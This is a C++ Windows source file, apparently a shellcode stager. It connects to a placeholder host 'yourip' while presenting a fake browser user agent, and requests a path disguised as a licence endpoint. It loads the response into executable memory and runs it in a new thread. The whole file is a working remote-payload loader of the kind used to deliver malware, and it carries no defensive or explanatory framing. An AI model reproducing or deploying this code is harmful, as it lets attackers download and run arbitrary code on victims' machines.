#include <iostream>
#include <Windows.h>
#include <stdio.h>
#include <Wininet.h>

using namespace std;

#pragma comment(lib, "wininet")

int main(int argc, char* argv[])
{

	HINTERNET nethandle = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; WOW64) (KHTML, like Gecko) Chrome/77.0 Safari/536", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (nethandle == NULL)
	{
		printf("InternetOpen Error: %d\n", GetLastError());

		return 0;
	}

	char* host = (char*)"yourip";
	HINTERNET Session = InternetConnectA(nethandle, host, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
	if (Session == NULL)
	{
		printf("InternetConnect Error: %d\n", GetLastError());

		return 0;
	}

	HINTERNET HttpRequest = HttpOpenRequestA(Session, "GET", "/api/v2/GetLicence", "HTTP/1.0", NULL, NULL, INTERNET_FLAG_DONT_CACHE, 0);
	if (HttpRequest == NULL)
	{
		printf("HttpOpenRequest Error: %d\n", GetLastError());

		return 0;
	}

	int ret = HttpSendRequestA(HttpRequest, NULL, 0, NULL, 0);
	if (ret == FALSE)
	{
		printf("HttpSendRequest Error: %d\n", GetLastError());

		return 0;
	}

	char* statscode[16] = { 0 };
	int size = 16;
	ret = HttpQueryInfoA(HttpRequest, HTTP_QUERY_STATUS_CODE, statscode, (LPDWORD)&size, NULL);
	if (ret == FALSE)
	{
		printf("HttpQueryInfo Error: %d\n", GetLastError());

		return 0;
	}
	int scode = atoi((const char*)statscode);
	printf("Code: %d\n", scode);
	if (scode != HTTP_STATUS_OK && scode != HTTP_STATUS_CREATED)
	{
		printf("%d Please Retry\n", scode);

		return 0;
	}

	char* contentL[16] = { 0 };
	size = 16;
	ret = HttpQueryInfoA(HttpRequest, HTTP_QUERY_CONTENT_LENGTH, contentL, (LPDWORD)&size, NULL);
	int length = atoi((const char*)contentL);
	cout << "Length: " << length << "\n";
	if (ret == FALSE)
	{
		printf("HttpQueryInfo Error: %d\n", GetLastError());

		return 0;
	}

	void* c = VirtualAlloc(NULL, length + 1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	int readed = 0;
	InternetReadFile(HttpRequest, c, length + 1, (LPDWORD)&readed);

	char* cc = (char*)c + 10;

	HANDLE ct = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)cc, NULL, 0, NULL);
	WaitForSingleObject(ct, INFINITE);

	VirtualFree(c, length + 1, MEM_DECOMMIT);

	return 0;
}